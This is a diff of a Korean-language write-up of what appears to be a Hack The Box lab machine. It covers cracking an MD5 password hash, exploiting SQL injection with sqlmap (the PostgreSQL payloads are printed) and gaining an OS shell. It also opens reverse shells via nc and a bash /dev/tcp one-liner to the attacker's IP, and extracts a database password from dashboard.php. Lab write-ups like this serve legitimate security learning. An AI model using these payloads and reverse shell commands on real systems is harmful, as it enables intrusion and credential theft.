@@ -162,10 +162,10 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Almost done: Processing the remaining buffered candidate passwords, if any.
 Proceeding with wordlist:/usr/share/john/password.lst
 Proceeding with incremental:ASCII
-
 ```
 
-```
+타 사용자의 글을 리서치 해보니 hashcat으로 가능한 듯 하여 동시에 실행해놓았다.
+``` bash
 ┌──(root㉿9048af13b510)-[/htb]
 └─# hashcat -a 0 -m 0 md5.txt
 
@@ -186,8 +186,132 @@ Restore.Sub.#1...: Salt:0 Amplifier:0-0 Iteration:0-1
 Candidate.Engine.: Device Generator
 Candidates.#1....: [Copying]
 ```
-
-
-https://crackstation.net/
+그러던 중 아래 사이트를 발견하게 되었는데, 압도적으로 빠르게 결과를 찾아주어 용이하다.
+> https://crackstation.net/
 
 ![](../assets/image_post/20240226232000.png)
+
+이제 획득한 패스워드 평문 값('qwerty789')을 통해 로그인 시 Dashboard 화면이 나타난다. SEARCH 부분에 sql injection 테스트를 해보니 에러 문구를 통해 가능할 것으로 보인다.
+![](../assets/image_post/20240227103045.png)
+
+자세한 테스트를 위해 sqlmap으로도 확인해보았다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# sqlmap -u 'http://10.129.107.51/dashboard.php?search=1' --cookie="PHPSESSID=sfbh6um3n94qpnm05vaq842sss" dbs
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.7.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:33:44 /2024-02-26/
+...
+sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=1' AND (SELECT (CASE WHEN (4027=4027) THEN NULL ELSE CAST((CHR(99)||CHR(105)||CHR(66)||CHR(73)) AS NUMERIC) END)) IS NULL-- TImU
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=1' AND 6785=CAST((CHR(113)||CHR(122)||CHR(122)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (6785=6785) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(98)||CHR(113)) AS NUMERIC)-- zqts
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries
+    Payload: search=1';SELECT PG_SLEEP(5)-- pljM
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=1' AND 3067=(SELECT 3067 FROM PG_SLEEP(5))-- SpUa
+---
+[20:34:42] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[20:34:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.107.51'
+
+[*] ending @ 20:34:46 /2024-02-26/
+```
+
+그러던 중 sqlmap에 os-shell이란 인자가 있음을 알았고, 해당 인자를 사용하면 원격으로 쉘을 연결할 수 있게 도와준다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# sqlmap -u 'http://10.129.107.51/dashboard.php?search=1' --cookie="PHPSESSID=sfbh6um3n94qpnm05vaq842sss" --os-shell
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+...
+[21:16:05] [INFO] fingerprinting the back-end DBMS operating system
+[21:16:07] [INFO] the back-end DBMS operating system is Linux
+[21:16:08] [INFO] testing if current user is DBA
+[21:16:09] [INFO] retrieved: '1'
+[21:16:09] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[21:16:09] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a]
+[21:16:22] [INFO] retrieved: 'postgres'
+command standard output: 'postgres'
+```
+
+os-shell로 접속 후 바로 user.txt의 flag를 확인할 수 있다.
+``` bash
+os-shell> ls /var/lib/postgresql
+[21:18:17] [INFO] retrieved: '11'
+[21:18:18] [INFO] retrieved: 'user.txt'
+command standard output:
+---
+11
+user.txt
+---
+
+os-shell> cat /var/lib/postgresql/user.txt
+[21:18:48] [INFO] retrieved: 'ec9b13ca4d6229cd5cc1e09980965bf7'
+command standard output: 'ec9b13ca4d6229cd5cc1e09980965bf7'
+```
+
+nc 파일을 대상 서버로 옮겨 리버스 쉘을 맺으려 했으나 자꾸 실패하였다. 원래라면 그냥 불편하게 os-shell을 통해 해도 되지만, 이상하게도 해당 방식으로 파일의 내용을 출력하거나 할 경우 나오지 않는 경우가 많아 해결이 필요했다.
+``` bash
+# 대상 서버
+os-shell> /var/lib/postgresql/nc 10.10.14.175 443 -e sh
+[23:31:17] [WARNING] the SQL query provided does not return any output
+[23:31:17] [INFO] retrieved:
+No output
+
+# 공격자 서버
+┌──(root㉿kali)-[/home/user]
+└─# nc -lvp 443
+listening on [any] 443 ...
+10.129.250.55: inverse host lookup failed: Unknown host
+connect to [10.10.14.175] from (UNKNOWN) [10.129.250.55] 50172
+```
+
+위 방식으로 파일을 보려면 대상 서버에 python으로 서버를 띄워 직접 공격자 서버로 파일을 옮겨 봐야했다. 아래와 같이 내용이 보이지 않는다.
+``` bash
+os-shell> cat /var/www/html/dashboard.php
+
+[04:30:30] [WARNING] the SQL query provided does not return any output
+[04:30:30] [INFO] retrieved:
+No output
+```
+
+쉘 연결하는 방법은 다른 사람의 글을 참고했다. 왜인지는 모르겠으나, `bash -c`를 붙여서 실행해주어야 한다. 그렇지 않을 경우 쉘이 연결되지 않으며 nc의 경우 해당 방식으로도 실패한다.
+``` bash
+os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.175/443 0>&1'
+```
+
+
+
+```
+┌──(root㉿kali)-[/home/user]
+└─# cat dashboard.php| grep password
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+```
